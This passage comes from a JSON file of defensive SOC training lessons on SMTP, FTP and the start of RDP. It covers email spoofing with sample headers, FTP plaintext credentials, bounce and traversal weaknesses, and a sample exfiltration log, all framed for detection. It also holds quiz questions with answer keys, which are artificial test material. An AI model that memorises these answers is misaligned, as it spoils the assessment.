      "content": "**SMTP** stands for **Simple Mail Transfer Protocol**. Its single, specific job is to **send** email and relay it between mail servers until it reaches the recipient's mailbox. It is the protocol that pushes a message from the sender toward its destination.\n\nA crucial clarification up front: SMTP is for **sending and relaying**, not for **reading**. When you open your inbox, a different protocol — **IMAP** (or the older **POP3**) — retrieves the stored messages for you. Think of it this way: **SMTP is the postal service that carries and delivers the letter; IMAP/POP3 is you opening your mailbox to read what arrived.** Keeping this split clear avoids a common beginner confusion.\n\nThe real-life analogy runs throughout: SMTP is the **mail-carrier network**. When you send a letter, you hand it to your local post office, which passes it through sorting facilities and other post offices until it reaches the recipient's local branch and their mailbox. SMTP servers play the role of those post offices, handing the message along until it arrives.\n\nSMTP handles the *transfer* — the addressing, the handoffs between servers, and the delivery — for essentially all internet email. Because every phishing email, every malicious attachment, and every business-email-compromise message is *delivered by SMTP*, understanding how it works is directly relevant to the attacks a SOC investigates most. And as the later sections show, one property of SMTP — how easy it is to lie about who sent a message — is the root of a whole category of attacks."
    },
    {
      "heading": "How SMTP Works: The Journey and the Ports",
      "content": "Sending an email is a relay across several servers, and understanding the journey clarifies both how mail works and where security checks happen.\n\n**The journey:**\n\n1. Your mail client (or webmail) hands the message to your organisation's **outgoing mail server** (submission).\n2. That server looks up the recipient domain's mail server using DNS **MX records** (Mail Exchange records that say 'this server handles mail for example.com').\n3. It connects to the recipient's mail server and **relays** the message via SMTP.\n4. The recipient's server accepts it and places it in the recipient's mailbox, where **IMAP/POP3** will later fetch it for reading.\n\n**The ports:**\n\n- **Port 25** — the classic SMTP port used for **server-to-server** relay between mail servers.\n- **Port 587** — the modern **submission** port, used by mail clients to send outgoing mail, with authentication and encryption (STARTTLS).\n- **Port 465** — SMTP over TLS (SMTPS), another secure submission option.\n\n(For retrieval, remember the companions: **IMAP** on 143/993 and **POP3** on 110/995.)\n\n**What the conversation looks like:** SMTP is a text-based protocol with a small set of commands. A simplified exchange is almost human-readable: the sending server says `HELO`/`EHLO` (hello), then `MAIL FROM:` (who it claims to be sending from), `RCPT TO:` (the recipient), `DATA` (here comes the message), and the message content follows. **Behind the scenes**, this is where a critical security subtlety lives: the `MAIL FROM` (the 'envelope' sender) and the `From:` header the user sees are *separate*, and both are simply stated by the sender — nothing in basic SMTP verifies they are truthful. That design decision, made when the internet was small and trusted, is exactly why email forgery is so easy, as the next section explains."
    },
    {
      "heading": "Why Email Is So Easy to Forge",
      "content": "The most important thing a SOC analyst must understand about SMTP is that **basic SMTP does nothing to verify who a message really came from.** The sender simply *states* the sender address, and the receiving server, by default, believes it.\n\nThis is the root of **email spoofing**: an attacker can put `From: ceo@yourcompany.com` on a message they sent themselves, and to the recipient it appears to come from the CEO. Nothing in the core protocol stops this — it is the engine behind most **phishing** and **business email compromise (BEC)**. The problem is architectural, not a bug: SMTP was designed for a small, trusting network and never built in sender verification.\n\nBecause of this, three add-on mechanisms were created to *authenticate* email, and analysts must know them (they are published in DNS and connect to the email-security lessons):\n\n- **SPF (Sender Policy Framework)** — the domain owner publishes a list of servers allowed to send mail for the domain; the receiver checks whether the sending server is on that list.\n- **DKIM (DomainKeys Identified Mail)** — the sending server cryptographically **signs** the message; the receiver verifies the signature using a public key in DNS, proving the message is authentic and unaltered.\n- **DMARC** — ties SPF and DKIM together, requires the authenticated domain to align with the visible `From:` address, and tells receivers what to do when checks fail (nothing, quarantine, or reject).\n\nAnother classic weakness is the **open relay** — a misconfigured SMTP server that will relay mail for *anyone*, which spammers and attackers abuse to send mail that appears to come from a legitimate server. Properly configured servers only relay for authenticated users or their own domains.\n\nThe takeaway is that **email trust is not built into SMTP; it is bolted on afterward with SPF, DKIM, and DMARC.** Understanding that the protocol itself is trusting and forgeable is what makes an analyst appropriately skeptical of the 'From' line — and points directly to where the real verification (the authentication results) lives."
    },
    {
      "heading": "Attachments, Links, and the Anatomy of a Phishing Email",
      "content": "SMTP happily carries far more than plain text: the **MIME** standard (Multipurpose Internet Mail Extensions) lets a single email bundle a text body, an HTML-formatted version, and one or more **attachments** — all riding along inside the same SMTP `DATA` transmission described earlier. This flexibility is completely legitimate and used constantly for invoices, reports, and images, but it is also the delivery mechanism for nearly every phishing payload.\n\nA typical malicious email leans on one of two techniques, both of which SMTP transports with total indifference to their intent:\n\n- **A malicious attachment** — commonly an Office document with a macro, a script disguised with a document-like icon, or an archive hiding an executable. SMTP does not inspect or judge the attachment; it is just a block of encoded data inside the message, which is why detection has to happen elsewhere — at the mail gateway (scanning attachments before delivery) or at the endpoint (watching what the attachment does once opened).\n- **A malicious link** — a URL in the body pointing to a credential-harvesting page or a malware download. The link itself often uses a **lookalike domain** (`micros0ft-support.com`, or a subdomain trick like `login.microsoft.com.attacker-domain.com`) designed to pass a rushed glance.\n\nBeyond the payload, phishing relies heavily on **social engineering** carried in the message body — urgency ('your account will be suspended today'), authority (impersonating a CEO or IT department), and a plausible pretext (an 'invoice' or 'shared document' notification) — all of which are just ordinary text and formatting that SMTP transmits exactly like any legitimate email, because the protocol has no concept of intent.\n\nThis is precisely why phishing defense is layered rather than resting on any one control: SMTP-level authentication (SPF/DKIM/DMARC, covered in the previous section) filters out forged senders; mail-gateway scanning inspects attachments and rewrites/checks links; and user training addresses the social-engineering text that no protocol-level check can evaluate. Recognising which layer caught (or missed) a given phishing email is a routine and valuable part of SOC triage — was it blocked at authentication, at attachment scanning, or did it reach the user and rely on them clicking?"
    },
    {
      "heading": "Why SMTP Matters to a SOC Analyst",
      "content": "Since email is the leading way attackers get in, SMTP knowledge is directly applied every time a SOC investigates a suspicious message. Two areas dominate.\n\n### 1. Phishing and BEC investigation\n\nWhen a suspicious email is reported, understanding SMTP tells you where to look:\n\n- **Read the headers.** Email **headers** record the message's journey through SMTP servers (the `Received:` lines), the envelope and header sender addresses, and — critically — the **SPF, DKIM, and DMARC results**. A message claiming to be from your CEO that shows `spf=fail dkim=fail dmarc=fail` is very likely spoofed. Reading these authentication results is one of the fastest, highest-value moves in phishing triage.\n- **Trace the path.** The `Received:` headers show which servers handled the message and the originating IP, helping you spot mail that did not come from where it claims.\n- **Spot mismatches.** A gap between the friendly display name, the `From:` header, and the actual envelope sender (`MAIL FROM`) is a common spoofing tell.\n\n**2. Detecting malicious mail activity in logs and traffic:**\n\n- **Inbound threats** — phishing waves, malicious attachments, and links arriving via SMTP (mail-gateway logs record senders, subjects, and verdicts).\n- **Outbound abuse** — a compromised internal account or server suddenly **sending** large volumes of mail can indicate it is being used for spam, phishing, or exfiltration; unusual outbound SMTP is a signal.\n- **Exfiltration over email** — attackers sometimes steal data by emailing it out; large or unusual outbound messages to external domains are worth watching.\n- **Open relay abuse and spoofing** — traffic patterns and authentication failures reveal servers being abused or domains being impersonated.\n\nThe analyst mindset is to treat **SMTP headers as the evidence trail of an email**, and the **SPF/DKIM/DMARC results as the verdict on whether the sender is genuine**. Because SMTP itself is trusting and forgeable, the analyst's job is to apply the verification the protocol lacks — reading the journey and the authentication results to separate a real message from a convincing forgery. That skill, grounded in how SMTP actually moves and labels mail, is central to defending the channel attackers use most."
    },
    {
      "heading": "A Worked Example: Reading Email Headers for Spoofing",
      "content": "A user forwards a suspicious email claiming to be from the CEO. The relevant header lines read:\n\n```\nFrom: \"John Carter, CEO\" <j.carter@corp-example.com>\nReturn-Path: <j.carter@corp-exarnple.com>\nReceived: from mail.unrelated-host.net (203.0.113.90) by mx.corp-example.com\nAuthentication-Results: mx.corp-example.com;\n spf=fail smtp.mailfrom=corp-exarnple.com;\n dkim=none;\n dmarc=fail header.from=corp-example.com\n```\n\nWalking through it field by field: the visible `From:` shows a name and address that looks entirely legitimate at a glance — `j.carter@corp-example.com`. But the `Return-Path` (the true envelope sender, the `MAIL FROM` from earlier in this lesson) is `j.carter@corp-exarnple.com` — note the swapped letters, `exarnple` instead of `example`, a classic lookalike domain designed to be misread quickly. The `Received` line shows the message actually entered from `mail.unrelated-host.net`, an address with no obvious connection to the organisation. And the `Authentication-Results` line delivers the verdict directly: `spf=fail`, `dkim=none`, `dmarc=fail` — every mechanism this lesson described as bolted onto SMTP for exactly this purpose has failed.\n\n**The conclusion an analyst draws:** this message did not come from the real corporate domain, and the receiving mail system correctly flagged it as such. **The questions to ask next:** did the mail gateway quarantine it, or did it reach the user's inbox despite the failing checks (a policy/configuration gap worth raising)? Did the user click any link or open any attachment before reporting it (search the same lookalike domain and sender across other mailboxes for a wider campaign)? And should `dmarc=fail` on this domain result in automatic rejection going forward, tightening the policy the organisation publishes in DNS?\n\nThis header block demonstrates the whole chapter compressed into five lines: the friendly `From:` that anyone can type, the true `Return-Path` a careless read misses, the `Received` path showing the real origin, and the SPF/DKIM/DMARC verdict that turns 'this looks like the CEO' into a documented, defensible 'this is spoofed.'"
    }
  ],
  "keyTakeaways": [
    "SMTP (Simple Mail Transfer Protocol) has one job — sending and relaying email between mail servers — while reading mail is done by IMAP (143/993) or POP3 (110/995); SMTP is the postal service, IMAP/POP3 is opening your mailbox.",
    "Email travels by the sender's server looking up the recipient domain's DNS MX record and relaying via SMTP; ports are 25 (server-to-server relay), 587 (authenticated submission with STARTTLS), and 465 (SMTPS).",
    "Basic SMTP does not verify the sender — the envelope MAIL FROM and the visible From: header are simply stated and believed — which makes spoofing easy and is the root of phishing and BEC; trust is bolted on afterward with SPF (allowed servers), DKIM (cryptographic signature), and DMARC (alignment + policy), all published in DNS.",
    "SOC analysts apply SMTP knowledge to phishing/BEC triage by reading email headers (Received: path, envelope vs From: sender, and especially SPF/DKIM/DMARC results, where fail = likely spoofed) and by watching for malicious inbound mail, unusual outbound SMTP (compromised account/exfiltration), and open-relay abuse.",
    "Phishing relies on MIME-carried attachments/links plus social engineering (urgency, authority, lookalike domains) that SMTP transmits with total indifference to intent; defense is layered across SPF/DKIM/DMARC, mail-gateway attachment/link scanning, and user judgement, since no single control catches everything."
  ],
  "quiz": [
    {
      "question": "A user reports an email that appears to come from the company CEO requesting an urgent wire transfer. Which SMTP-related evidence best helps you determine whether the sender address was forged?",
      "options": [
        {
          "label": "The DHCP lease table, because it records which mail server was authorised to send on behalf of the CEO's domain at the time the message was sent.",
          "value": "a"
        },
        {
          "label": "The email headers, especially the SPF, DKIM, and DMARC authentication results, since failures strongly indicate the From address was spoofed.",
          "value": "b"
        },
        {
          "label": "The recipient's IMAP folder size, because a forged sender always causes the mailbox to grow at an abnormal rate that reveals the spoofing attempt.",
          "value": "c"
        },
        {
          "label": "Nothing can tell you, because SMTP cryptographically guarantees every From address is genuine, so a displayed CEO address is always authentic.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Because basic SMTP does not verify the sender, the way to judge authenticity is the email headers — the Received path, the envelope-vs-From addresses, and especially the SPF/DKIM/DMARC results, where failures strongly indicate spoofing. Option a misuses DHCP, which has nothing to do with mail authorisation. Option c invents a mailbox-size signal that does not exist. Option d is the opposite of the truth: SMTP does not guarantee the From address is genuine, which is exactly why spoofing works."
    },
    {
      "question": "Why is email spoofing fundamentally easy, and what mechanisms were added to address it?",
      "options": [
        {
          "label": "Because basic SMTP simply believes the sender address it is told; SPF, DKIM, and DMARC were added (published in DNS) to authenticate senders afterward.",
          "value": "a"
        },
        {
          "label": "Because SMTP encrypts every message so strongly that receivers cannot check the sender; TLS 1.3 was added later to finally allow sender verification.",
          "value": "b"
        },
        {
          "label": "Because email is delivered over port 3389, which has no authentication; moving email to port 22 was the fix that eliminated all spoofing.",
          "value": "c"
        },
        {
          "label": "Because spoofing requires stealing the sender's password first; enforcing longer passwords was the mechanism created to make forgery impossible.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Spoofing is easy because basic SMTP was designed for a trusting network and simply accepts the sender address it is given without verification; SPF (allowed sending servers), DKIM (cryptographic signature), and DMARC (alignment and policy) were added and published in DNS to authenticate senders after the fact. Option b is wrong because encryption is not why spoofing works. Option c invents wrong ports (email is not on 3389/22). Option d is false because spoofing needs no password — the attacker just states a false From address."
    },
    {
      "question": "In a forwarded phishing email's headers, the visible From: address looks correct, but the Return-Path reads j.carter@corp-exarnple.com (swapped letters) and Authentication-Results shows spf=fail, dkim=none, dmarc=fail. What should the analyst conclude?",
      "options": [
        {
          "label": "The message is confirmed spoofed from a lookalike domain, since the failing authentication results and the mismatched Return-Path both point to forgery.",
          "value": "a"
        },
        {
          "label": "The message is safe, because a visually correct From: display name always overrides any Return-Path or authentication result shown in the headers.",
          "value": "b"
        },
        {
          "label": "The failing results are a formatting bug, because SPF, DKIM, and DMARC checks routinely fail on legitimate mail for no meaningful reason at all.",
          "value": "c"
        },
        {
          "label": "The lookalike Return-Path is irrelevant, because only the visible From: name is ever used to determine whether a message is genuine or forged.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "A lookalike Return-Path domain combined with spf=fail, dkim=none, and dmarc=fail is exactly the evidence trail this lesson describes for a spoofed message — the visible From: is easy to fake, but the envelope path and authentication results are not, and here they both point clearly to forgery. Option b wrongly treats the easily-faked display name as authoritative. Option c dismisses a genuine, meaningful signal as a bug. Option d ignores the Return-Path mismatch, which is one of the clearest spoofing tells covered in this lesson."
    }
  ],
  "references": [
    "https://datatracker.ietf.org/doc/html/rfc5321",
    "https://dmarc.org/overview/",
    "https://attack.mitre.org/techniques/T1566/"
  ],
  "xp": 220,
  "estimatedMinutes": 46,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-ftp-explained",
  "slug": "ftp-explained-standalone",
  "title": "FTP Explained: File Transfer, Plaintext Risk, and Exfiltration",
  "topic": "Network Protocols",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "FTP is one of the oldest protocols still in use, built for a single purpose: moving files between computers. It is simple, common on older systems, and — in its classic form — dangerously insecure, which makes it both a hygiene concern and a data-exfiltration channel a SOC should watch. This focused lesson covers FTP end to end: what it is and why it exists, how its unusual two-channel design and ports work, why classic FTP sends everything in plaintext, the secure alternatives, and why FTP activity matters to an analyst.",
  "sections": [
    {
      "heading": "What FTP Is and Why It Exists",
      "content": "**FTP** stands for **File Transfer Protocol**. Its single job is exactly what the name says: to **transfer files** between a client and a server over a network — uploading and downloading files, listing directories, and managing files on a remote system.\n\nFTP is one of the internet's original protocols, predating the web, and it was built when file transfer was a core need and security was not yet a concern. The real-life analogy is a **loading dock between two warehouses**: a dedicated channel whose whole purpose is moving crates (files) back and forth in bulk, in both directions.\n\nEven today FTP shows up in specific places: legacy systems, some website management, automated transfers between business systems, and older internal tools. You connect with a dedicated FTP client (or command-line `ftp`), authenticate with a username and password, and then issue commands to `put` (upload) and `get` (download) files, or list directories.\n\nA notable feature is **anonymous FTP** — servers configured to allow anyone to connect with a generic 'anonymous' login, historically used for public file downloads. Convenient, but a security consideration, since it grants access without real authentication.\n\nWhy an analyst should care from the start: FTP's age means it carries a fundamental security weakness (covered shortly), and its purpose — moving files in bulk — makes it a natural channel for **data exfiltration**. Understanding FTP is partly about recognising a legacy protocol that often should be replaced, and partly about knowing why its presence, especially outbound, deserves a second look."
    },
    {
      "heading": "How FTP Works: Two Channels and Its Ports",
      "content": "FTP has an unusual design that sets it apart from most protocols: it uses **two separate connections** at once — one for commands, one for the actual file data.\n\n- **The control channel (port 21)** carries the **commands and responses** — logging in, listing directories, and requesting transfers. This connection stays open for the whole session.\n- **The data channel** carries the **actual file contents** during a transfer.\n\nThis split is why FTP has two **modes**, a detail that matters for firewalls and troubleshooting:\n\n- **Active mode** — the *server* opens the data connection back to the client (traditionally from port **20**). This often causes problems with client-side firewalls, because the firewall sees an unexpected inbound connection.\n- **Passive mode** — the *client* opens the data connection to the server (on a port the server specifies), which works better through firewalls and is the common default today.\n\n**The ports to remember:** FTP uses **TCP port 21** for the control channel (the one you will most associate with FTP) and **port 20** for active-mode data, with passive mode using ephemeral ports.\n\n**What the conversation looks like:** like SMTP, FTP is text-based and fairly readable. After connecting to port 21, the client sends commands such as `USER` (username), `PASS` (password), `LIST` (list files), `RETR` (retrieve/download), and `STOR` (store/upload), and the server replies with numeric status codes. **Behind the scenes**, here is the critical part: in classic FTP, this entire exchange — *including the `USER` and `PASS` commands carrying the username and password* — travels as plain, unencrypted text. That design choice, fine in FTP's trusting early era, is the source of its biggest security problem, which the next section addresses."
    },
    {
      "heading": "The Plaintext Problem and Secure Alternatives",
      "content": "The defining security fact about classic FTP is that **it sends everything in plaintext — including credentials.** The username and password used to log in, and the contents of every file transferred, travel unencrypted across the network. Anyone able to capture the traffic (recall the Wireshark lesson) can read the login and the data directly.\n\nThis is a serious weakness. In a packet capture of a plain FTP session, an analyst — or an attacker — can literally see `USER admin` and `PASS Summer2026!` in the clear, along with the files. For this reason, **plain FTP should not be used over untrusted networks**, and finding it in use is a hygiene finding worth flagging, much like discovering Telnet.\n\nBecause of this, secure alternatives exist, and it is important to keep them straight because their names are confusingly similar:\n\n- **FTPS (FTP Secure)** — this is FTP with **TLS encryption** added, wrapping the classic FTP protocol in the same kind of encryption HTTPS uses. It still uses FTP's two-channel design.\n- **SFTP (SSH File Transfer Protocol)** — despite the similar name, this is **not FTP at all**. It is a completely different protocol that runs **over SSH** (port 22), inheriting SSH's encryption and authentication. SFTP is the common modern choice for secure file transfer.\n\nThe key distinction for an analyst: **FTPS = FTP + TLS; SFTP = file transfer over SSH.** They both solve the plaintext problem, but they are different technologies on different ports.\n\nThe practical guidance is that legitimate environments should be using FTPS or SFTP, not plain FTP. So when plain FTP (port 21, unencrypted) appears — especially with credentials visible or reaching external destinations — it is both a security-hygiene concern and, as the next section covers, a potential exfiltration channel worth investigating."
    },
    {
      "heading": "FTP Bounce and Other Legacy Weaknesses",
      "content": "The plaintext problem is FTP's most famous flaw, but its age produced several other weaknesses worth knowing, because they show up in vulnerability scans and older security advisories an analyst may encounter.\n\nThe **FTP bounce attack** exploits the `PORT` command, which — in active mode — lets a client tell the server *which IP address and port* to send data to. Normally that is the client's own address, but nothing in the original protocol stops a client from specifying a *different* target entirely. An attacker could instruct an FTP server to open a data connection to a third machine — effectively using the FTP server as a relay to scan or reach a system the attacker could not contact directly, disguising the true source of the traffic. This is why FTP bounce is treated as a classic vulnerability and why modern FTP server software restricts the `PORT` command to the connecting client's own address.\n\n**Directory traversal** is another recurring issue: a poorly-configured FTP server may not properly restrict a client to their intended directory, letting a crafted path (using `../` sequences) reach files outside the area they should be confined to — the same traversal idea that appears in the HTTP lesson, just applied to FTP's file-retrieval commands.\n\n**Weak default configurations** round out the picture: many FTP servers historically shipped with **anonymous access enabled by default**, or with world-writable upload directories intended for convenience that attackers instead use to stage malware or deface content, since anyone can write files there without authenticating at all.\n\nNone of these issues are exotic or new — they are exactly the kind of finding a vulnerability scanner flags on an old FTP server, and exactly why the guidance in this lesson is consistently the same: **legacy FTP servers accumulate legacy weaknesses**, and the fix is rarely to patch around each one individually. It is to retire plain FTP in favour of FTPS or SFTP, and to treat the mere presence of an old, unmaintained FTP service as a finding worth investigating on its own, regardless of which specific flaw it happens to carry."
    },
    {
      "heading": "Why FTP Matters to a SOC Analyst",
      "content": "FTP matters to a SOC for two connected reasons: it is a security weakness when present, and its file-moving purpose makes it a natural exfiltration path.\n\n**As a weakness and hygiene finding:**\n\n- **Plaintext credentials.** Plain FTP exposes usernames and passwords to anyone capturing traffic. Its presence on the network, especially crossing untrusted links, is worth flagging — attackers who sniff or capture FTP traffic can harvest working credentials.\n- **Anonymous and weakly-secured FTP servers.** An anonymous or poorly-configured FTP server can expose files to anyone, and attackers scan the internet for such servers to steal data or host malware.\n\n**As an exfiltration and attack channel:**\n\n- **Data exfiltration.** Because FTP exists to move files in bulk, attackers use it to **upload stolen data** out of a network to a server they control. **Unusual outbound FTP** — an internal machine connecting out to an unfamiliar FTP server, or transferring large volumes — is a classic exfiltration signal. This is the primary reason to watch FTP.\n- **Malware distribution and tooling.** Attackers sometimes host malware on FTP servers or use FTP to pull additional tools onto a compromised host.\n- **Legacy exposure.** Old FTP servers with known vulnerabilities are targets in their own right.\n\n**What the SOC watches:**\n\n- **Outbound FTP to external or unfamiliar servers**, particularly large transfers — the exfiltration pattern.\n- **Plain FTP (port 21, unencrypted) in use at all**, as a hygiene and credential-exposure concern.\n- **Anonymous FTP access** and connections to known-bad FTP hosts.\n- **Credentials visible in captured FTP traffic**, confirming exposure.\n\nThe analyst mindset is that FTP is a legacy, often-insecure protocol whose very purpose — bulk file movement — aligns with what an attacker wants to do with your data. Seeing plain FTP is a prompt to ask 'why is this still here?', and seeing outbound FTP to an unknown destination is a prompt to ask 'is data leaving?'. Both questions, grounded in how FTP actually works, make this old protocol a meaningful part of a SOC's attention."
    },
    {
      "heading": "A Worked Example: Spotting FTP Exfiltration in Logs",
      "content": "An FTP server's session log shows the following for one connection:\n\n```\n22:41:02 CONNECT from 10.14.22.108\n22:41:03 USER contractor_jsmith\n22:41:03 PASS accepted\n22:41:05 CWD /finance/quarterly_reports\n22:41:07 STOR Q3_financials_master.xlsx (4.2 MB)\n22:41:22 STOR customer_export_full.csv (188 MB)\n22:41:58 STOR contracts_backup.zip (340 MB)\n22:44:10 QUIT\n```\n\nAnd separately, network flow logs show that `10.14.22.108` is not the FTP *server's* own address but is actually the internal workstation acting as the *client*, connecting outbound to an FTP server hosted at an unfamiliar external IP.\n\nWalking through it: the account `contractor_jsmith` navigates (`CWD`) into a finance directory and then issues three `STOR` commands — remember, `STOR` means **upload**, sending data *out* — transferring over 500 combined megabytes, including a customer export and a contracts archive, to an external server, all within about three minutes.\n\n**The questions this raises immediately:** is `contractor_jsmith` an active, authorised account, and does that person's role plausibly involve exporting customer and contract data at all? Is the destination FTP server a known, approved business partner, or an unfamiliar external address with no prior relationship in the logs? Was this transfer encrypted (FTPS) or, as the plaintext credentials in this excerpt suggest, sent as plain FTP — meaning the data itself may also have been readable in transit? And does the timing (22:41, outside normal business hours) fit this account's typical pattern, or is it anomalous?\n\nEvery element of this log traces back to a fact from earlier in the lesson: `STOR` is the upload command that makes FTP a bulk-transfer channel; the volume and destination match the exfiltration pattern described as FTP's primary SOC concern; and the visible `USER`/`PASS` exchange is the plaintext weakness that makes the account's credentials themselves part of the exposure. Together, they turn eight lines of session log into a clear, evidence-based case for escalation."
    }
  ],
  "keyTakeaways": [
    "FTP (File Transfer Protocol) exists solely to transfer files between a client and server; it is a legacy protocol still found on older systems, sometimes allowing anonymous (unauthenticated) access.",
    "FTP uniquely uses two connections — a control channel on TCP port 21 (commands like USER/PASS/LIST/RETR/STOR) and a separate data channel (port 20 in active mode, ephemeral ports in passive mode) — with passive mode working better through firewalls.",
    "Classic FTP sends everything, including the username and password, in plaintext, so it is readable in a packet capture and should be replaced; the secure alternatives are FTPS (FTP + TLS) and the differently-named SFTP (file transfer over SSH on port 22).",
    "SOC analysts treat FTP as both a hygiene finding (plaintext credentials, anonymous/weak servers) and, most importantly, an exfiltration channel — watching for unusual/large outbound FTP to unfamiliar servers, plain FTP in use, and credentials visible in captured traffic.",
    "FTP's legacy design carries other weaknesses beyond plaintext, including the FTP bounce attack (abusing the PORT command to relay/scan through the server), directory traversal, and default anonymous/world-writable configurations — reinforcing that retiring plain FTP for FTPS/SFTP is the fix, not patching each flaw individually."
  ],
  "quiz": [
    {
      "question": "An analyst captures network traffic and, in a plain FTP session on port 21, can directly read 'USER backupadmin' and 'PASS Wint3r2026!'. Why is this possible, and what does it imply?",
      "options": [
        {
          "label": "It is impossible; FTP always encrypts credentials, so the analyst must have misread an unrelated HTTPS session that happened to use port 21.",
          "value": "a"
        },
        {
          "label": "Classic FTP sends the login and file data in plaintext, so credentials are readable in captured traffic — a serious exposure that argues for FTPS or SFTP.",
          "value": "b"
        },
        {
          "label": "The credentials are only visible because the analyst has the decryption key; without it, plain FTP traffic is fully encrypted and unreadable.",
          "value": "c"
        },
        {
          "label": "This proves the FTP server is secure, because a properly configured server deliberately displays credentials in the clear to confirm they were received.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Classic FTP transmits everything — including the USER and PASS commands and the file contents — as unencrypted plaintext, so anyone capturing the traffic can read the credentials directly; this is a serious exposure and the reason to use FTPS (FTP + TLS) or SFTP (over SSH) instead. Option a is wrong because plain FTP does not encrypt credentials. Option c is false because no key is involved in reading plaintext. Option d absurdly reframes a vulnerability as a feature."
    },
    {
      "question": "During an investigation you notice an internal workstation making an outbound FTP connection to an unfamiliar external server and transferring several gigabytes of data. Why is this a high-priority finding?",
      "options": [
        {
          "label": "It is routine, because workstations normally back up several gigabytes to random external FTP servers over plaintext port 21 as part of standard operations.",
          "value": "a"
        },
        {
          "label": "FTP's purpose is bulk file transfer, so a large outbound FTP transfer to an unfamiliar server is a classic data-exfiltration pattern worth investigating.",
          "value": "b"
        },
        {
          "label": "It only indicates a DNS problem, because outbound FTP transfers are the standard symptom of a failed name-resolution lookup on the workstation.",
          "value": "c"
        },
        {
          "label": "It confirms the workstation is patched, because only fully updated machines are permitted to open outbound FTP connections to external servers.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "FTP exists to move files in bulk, so an internal machine sending several gigabytes over outbound FTP to an unfamiliar external server matches the classic data-exfiltration pattern and warrants immediate investigation. Option a wrongly normalises large transfers to random external FTP servers. Option c misattributes the behaviour to DNS. Option d invents a patching implication unrelated to the observation."
    },
    {
      "question": "A vulnerability report flags an old FTP server for allowing the FTP bounce technique via the PORT command. What does this attack actually let someone do, and why is it dangerous?",
      "options": [
        {
          "label": "It lets a client direct the FTP server to open a data connection to a third-party address, using the server as a relay that hides the true source.",
          "value": "a"
        },
        {
          "label": "It lets a client instantly decrypt any file stored on the FTP server, exposing every uploaded document without needing valid login credentials at all.",
          "value": "b"
        },
        {
          "label": "It lets a client permanently delete the server's entire file system, since the PORT command was originally designed to issue remote deletion requests.",
          "value": "c"
        },
        {
          "label": "It lets a client change the FTP server's administrator password remotely, since the PORT command doubles as a legacy password-reset mechanism.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "The FTP bounce attack abuses the PORT command's ability to specify an arbitrary destination IP and port for the data connection, letting an attacker make the FTP server open a connection to a third machine on their behalf — effectively relaying and disguising the true source of the traffic, useful for scanning systems the attacker cannot reach directly. Option b invents a decryption capability the PORT command does not have. Option c and option d both invent unrelated destructive/administrative capabilities that PORT was never designed for."
    }
  ],
  "references": [
    "https://datatracker.ietf.org/doc/html/rfc959",
    "https://attack.mitre.org/techniques/T1048/",
    "https://www.ssh.com/academy/ssh/sftp-ssh-file-transfer-protocol"
  ],
  "xp": 220,
  "estimatedMinutes": 44,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-rdp-explained",
  "slug": "rdp-explained-standalone",
  "title": "RDP Explained: Remote Desktop, Brute Force, and Ransomware Entry",
  "topic": "Network Protocols",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "RDP gives you the full graphical desktop of a Windows machine from anywhere — an enormously useful tool, and one of the most common ways ransomware gangs break into organisations. This focused lesson covers RDP thoroughly: what it is and why it is used, how it works and on which port, what RDP activity looks like, and why an exposed RDP port is one of the most dangerous things a SOC can find on the internet — the entry point behind a large share of real-world breaches.",
  "sections": [
    {
      "heading": "What RDP Is and Why It Is Used",
      "content": "**RDP** stands for **Remote Desktop Protocol**. It is Microsoft's protocol for connecting to and controlling the full **graphical desktop** of a Windows machine over a network — you see the remote computer's screen, and your keyboard and mouse control it, as if you were sitting in front of it.\n\nThe contrast with SSH is useful: where SSH gives a **text command-line** to a remote machine (mostly Linux), RDP gives a **full graphical desktop** (Windows). The real-life analogy is a **remote control that shows you the actual screen** — not just a text prompt, but the entire Windows desktop, windows, and applications, mirrored to you and responsive to your input.\n\nRDP is used constantly and legitimately:\n\n- **Remote administration** — IT staff managing Windows servers and desktops without walking to them.\n- **Remote work** — employees connecting to their office PC or a virtual desktop from home.\n- **Servers and jump boxes** — administering Windows servers in data centres and clouds.\n\nYou connect using a **Remote Desktop client** (the built-in `mstsc.exe` on Windows, or clients on other platforms), enter the target machine's address, and authenticate with a Windows username and password. Once connected, you have an interactive desktop session on that machine.\n\nWhy an analyst must take RDP seriously from the outset: because RDP hands over **full interactive control of a Windows machine**, a compromised RDP session is not a small foothold — it is an attacker sitting at the desktop with the user's privileges. That high value, combined with how often RDP is carelessly exposed to the internet, makes it one of the most consequential protocols in modern intrusions, as the rest of this lesson shows."
    },
    {
      "heading": "How RDP Works and Its Port",
      "content": "RDP is a **client/server** protocol that listens on **TCP port 3389** (it can also use UDP 3389 for performance). Port 3389 is the single most important number to associate with RDP, because its exposure is at the heart of RDP's security story.\n\n**The basic flow:**\n\n1. The **RDP client** connects to the target Windows machine on port 3389.\n2. The two negotiate the session, including **encryption** (modern RDP encrypts the session, and can use TLS).\n3. The user **authenticates** with Windows credentials, ideally protected by **Network Level Authentication (NLA)**, which requires authentication *before* a full session is established (an important hardening feature).\n4. Once authenticated, the server streams the **graphical desktop** to the client, and the client sends keyboard and mouse input back — a continuous, interactive session.\n\n**What it looks like in practice:** the user runs the Remote Desktop client, types the machine's name or IP, logs in, and sees the remote desktop appear in a window. Behind the scenes, RDP efficiently transmits screen updates one way and input the other, along with optional features like shared clipboard and drive redirection (which themselves carry security considerations).\n\n**Behind the scenes for security:** two settings dominate RDP's safety. First, **whether port 3389 is exposed to the internet** — an RDP port reachable from anywhere is an open invitation. Second, **whether NLA is enforced and strong authentication (and MFA) is required** — without these, RDP is protected only by a password that can be guessed. RDP sessions and logons are recorded in **Windows event logs** (logon events, and Terminal Services / Remote Desktop specific logs), which is where the SOC detections in the final section come from. Understanding that RDP = full desktop control over port 3389, gated only by Windows authentication, is what makes its risks clear."
    },
    {
      "heading": "Why Exposed RDP Is So Dangerous",
